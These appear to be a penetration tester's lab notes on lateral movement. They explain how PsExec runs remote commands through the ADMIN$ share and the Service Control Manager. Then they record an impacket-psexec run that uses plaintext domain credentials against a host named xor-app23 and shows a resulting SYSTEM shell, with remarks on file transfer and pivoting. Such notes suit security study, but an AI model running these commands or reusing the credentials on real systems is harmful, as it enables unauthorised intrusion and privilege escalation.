
# TODO: need `psexec` or similar... maybe impacket has...
# ubuntu has `winexe`. cute.
# meterpreter has a psexec module but we don't want to rely on that
# the real psexec is a windows binary part of pstools < sysinternals
#   article by author Mark Russinovich describes how it works
#    https://www.itprotoday.com/windows-server/psexec-explainer-mark-russinovich
#    features:
#    - can remote exec with no software on remote (requires a hidden Admin$ share which is default)
#    - can not just exec but pipe (both ways?)
#    - can also copy files to remote host, exec, and then remove when process ends
#    - you must auth with Administrator privelege account for it to execute processes on remote system
#    under the hood, how it works:
#    - PsExec does so by extracting from its executable image an embedded Windows service named Psexesvc 
#      and copying it to the Admin$ share of the remote system. 
#    - PsExec then uses the Windows Service Control Manager API, which has a remote interface,
#      to start the Psexesvc service on the remote system.

# so i can try psexec but if it fails its because i have a non-administrative privilege

# ah,
$ impacket-psexec XOR.COM/SQLServer:shantewhite@xor-app23.xor.com
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on xor-app23.xor.com.....
[*] Found writable share ADMIN$
[*] Uploading file CgDWqwDb.exe
[*] Opening SVCManager on xor-app23.xor.com.....
[*] Creating service CpsJ on xor-app23.xor.com.....
[*] Starting service CpsJ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.504]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
# wow!! even better than a service account... 
# and this shell can even put and download files. much preferable to reverse shell. 
  # pivot is probably not too hard either
# TODO: how am i not the svc user?
